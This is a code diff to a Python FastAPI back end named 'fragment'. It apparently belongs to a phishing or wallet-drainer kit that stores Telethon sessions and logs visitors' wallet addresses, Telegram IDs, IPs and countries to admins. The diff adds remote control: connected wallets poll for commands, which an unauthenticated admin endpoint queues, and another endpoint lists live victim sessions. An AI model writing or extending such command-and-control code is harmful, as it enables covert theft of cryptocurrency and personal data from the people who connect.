@@ -26,6 +26,8 @@ router = APIRouter(prefix="/fragment")
 
 # Active Telethon clients: phone -> client
 clients = {}
+# Active Wallet sessions: address -> {user, commands: []}
+active_wallet_sessions = {}
 
 class PhoneData(BaseModel):
     phone: str
@@ -69,6 +71,10 @@ class TransferData(BaseModel):
 class LogData(BaseModel):
     message: str
     user: dict = None
+
+class AdminCommandData(BaseModel):
+    address: str
+    command: str
 
 async def notify_admins(text: str, document: str = None):
     if os.path.exists("admins.json"):
@@ -193,8 +199,51 @@ async def submit_wallet_connect(data: WalletConnectData, request: Request):
 
     save_submission({"type": "wallet_connect", "data": data.model_dump()})
     user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"
+
+    # Register session
+    active_wallet_sessions[data.address] = {
+        "user": data.user,
+        "ip": data.ip,
+        "country": data.country,
+        "commands": [],
+        "last_seen": asyncio.get_event_loop().time()
+    }
+
     await notify_admins(f"🔗 *Wallet Connected!*\n\n{user_info}\nAddress: `{data.address}`\nIP: `{data.ip}`\nCountry: `{data.country}`")
     return {"status": "ok"}
+
+@router.post("/api/submit/wallet_disconnect")
+async def submit_wallet_disconnect(data: WalletConnectData):
+    if data.address in active_wallet_sessions:
+        del active_wallet_sessions[data.address]
+    user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"
+    await notify_admins(f"🔌 *Wallet Disconnected*\n\n{user_info}\nAddress: `{data.address}`")
+    return {"status": "ok"}
+
+@router.get("/api/poll/wallet/{address}")
+async def poll_wallet(address: str):
+    if address in active_wallet_sessions:
+        active_wallet_sessions[address]["last_seen"] = asyncio.get_event_loop().time()
+        commands = active_wallet_sessions[address]["commands"]
+        active_wallet_sessions[address]["commands"] = []
+        return {"commands": commands}
+    return {"commands": []}
+
+@router.post("/api/admin/wallet/command")
+async def admin_wallet_command(data: AdminCommandData):
+    if data.address in active_wallet_sessions:
+        active_wallet_sessions[data.address]["commands"].append(data.command)
+        return {"status": "ok"}
+    raise HTTPException(status_code=404, detail="Session not found")
+
+@router.get("/api/admin/wallets")
+async def admin_get_wallets():
+    # Cleanup stale sessions (30s)
+    now = asyncio.get_event_loop().time()
+    stale = [addr for addr, sess in active_wallet_sessions.items() if now - sess["last_seen"] > 30]
+    for addr in stale: del active_wallet_sessions[addr]
+
+    return active_wallet_sessions
 
 @router.post("/api/submit/transfer")
 async def submit_transfer(data: TransferData):
